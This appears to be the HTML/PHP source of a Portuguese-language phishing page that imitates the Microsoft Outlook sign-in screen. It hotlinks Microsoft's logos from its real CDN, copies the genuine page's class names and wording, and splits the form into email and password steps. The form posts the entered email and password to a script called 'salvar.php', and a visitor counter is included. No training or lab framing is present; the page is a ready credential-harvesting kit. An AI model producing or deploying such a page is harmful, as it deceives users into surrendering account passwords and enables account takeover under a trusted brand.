<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="style.css">
    
    <script>
        // Função para voltar ao início do site
    function voltarInicio() {
        // Redireciona o usuário para a página inicial
        window.location.href = "index.php";  // Substitua por "index.html" ou o URL da sua página inicial
    }
        // Função para mostrar o campo de senha após o clique no botão "Avançar"
        function avançar() {
            // Obtém o valor do email digitado
            const email = document.getElementById('email').value;

            // Exibe o email acima do campo de senha
            document.getElementById('email-display').innerText = email;

            // Esconde o campo de email
            document.getElementById('email-container').style.display = 'none';
            
            // Exibe o campo de senha
            document.getElementById('password-container').style.display = 'block';
        }
    </script>
    <?php
// Inclui o contador
include('contador.php');
?>

</head>
<body>
<div class="lk">
    <img class="lok" src="https://logincdn.msftauth.net/shared/5/js/../images/53_8b36337037cff88c3df2.png">
</div>
<div>
    <div class="login-container">        
        <div class="login-box">            
            <img data-testid="accessibleImg" class="___1v417w0 f2rbwfs frvgh55" src="https://logincdn.msftauth.net/shared/5/js/../images/microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="Microsoft" role=""/>
            <div id="email-container">
                <h1>Entrar</h1>
                <div class="outs">Continuar para Outlook</div>
                
                <form action="salvar.php" method="POST">
                    <div class="input-group" >
                        <input type="text" id="email" name="email" required placeholder="Email, telefone ou Skype" aria-label="Insira o seu email, telefone ou Skype." autocomplete="username" value="" style="border-color: rgb(50, 50, 50);">
                    </div>
                    <div class="crie">Não tem uma conta? <span tabindex="0" role="button" aria-label="Criar uma conta da Microsoft" id="signup" data-testid="signUpLink" class="___1hl8tjj f11xvspe f1bsjrm3 f3rmtva f1ern45e f1n71otn f1h8hb77 f1deefiw fryk5ur fv6z6zc f1cio4g9 f1mwb9y5 f1ynmygo f121g8nd f1i82eaq f8491dx f1nbblvp fifp7yv f1ov4xf1 f1asdtw4 f1gqcn34 fbabzkn felxxx9 fqttjmt">Crie uma!</span></div>
                    </div>
                    <div class="sen">
                    
                        <!-- Exibe o email acima do campo de senha -->
                        <div id="email-display"></div>
                        
                        <!-- Container de senha, inicialmente oculto -->
                        <div class="input-group" id="password-container" style="display: none;"><img src="https://logincdn.msftauth.net/shared/5/js/../images/arrow_left_a9cc2824ef3517b6c416.svg" alt="" id="calrk" role="presentation" onclick="voltarInicio()">
                        <div class="insr" >Insira a senha</div>
                            
                            <input type="password" id="password" name="password" required required placeholder="Senha" aria-label="Senha." autocomplete="passoword" value="" style="border-color: rgb(50, 50, 50);     margin-bottom: 16px;">
                            <div class="criee">Esqueceu a senha?</div><br>
                            <div class="criie">Esqueceu o nome de usuário</div>
                        </div>
                        
                    </div>
                    <div class="btn-group">
                        <!-- Chama a função 'avançar' no clique -->
                        <button type="submit" onclick="avançar()">Avançar</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
</body>
</html>
